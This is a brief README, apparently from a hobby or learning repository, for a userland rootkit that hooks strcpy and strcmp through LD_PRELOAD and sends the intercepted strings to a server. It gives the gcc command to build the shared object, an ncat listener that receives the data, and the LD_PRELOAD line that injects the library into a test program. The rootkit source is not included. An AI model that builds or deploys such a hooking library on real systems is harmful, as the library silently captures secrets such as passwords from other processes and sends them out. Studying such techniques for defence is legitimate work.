# Description
This is a simple userland rootkit that simple hooks the strcpy and strcmp functions and tries to send it to a server.

## Compilation

Compile rootkit:
```
gcc -shared -fPIC Rootkit.c -o Rootkit.so -ldl
```

Compile test program:
```
gcc main.c
```

## Running

Simple netcat server for testing:
```
ncat -k -l -p 8080
```

Then simply run the following command to use rootkit:
```
LD_PRELOAD=./Rootkit.so ./a.out
```